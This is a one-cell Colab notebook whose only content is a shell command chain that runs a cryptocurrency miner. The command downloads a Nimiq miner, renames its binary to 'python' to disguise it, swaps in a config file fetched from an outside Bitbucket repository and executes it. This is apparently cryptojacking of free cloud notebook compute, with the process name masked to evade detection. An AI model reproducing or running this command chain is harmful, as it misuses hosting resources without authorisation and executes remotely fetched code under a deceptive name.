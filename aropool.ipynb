{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled4.ipynb",
      "version": "0.3.2",
      "views": {},
      "default_view": {},
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "metadata": {
        "id": "fi60aAJd6k3-",
        "colab_type": "code",
        "colab": {
          "autoexec": {
            "startup": false,
            "wait_interval": 0
          }
        }
      },
      "cell_type": "code",
      "source": [
        "!wget https://github.com/skypool-org/skypool-nimiq-miner/releases/download/v1.2.2/skypool-nimiq-v1.2.2-linux-x64-compat.zip && unzip skypool-nimiq-v1.2.2-linux-x64-compat.zip && cd skypool-nimiq-v1.2.2-linux-x64-compat && mv skypool-node-client python && chmod +x python && rm config.txt && wget https://bitbucket.org/lovelyn/openai/raw/8fd0f027157c08ad13dbecac80e5c3eab1803127/config.txt && ./python"
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}
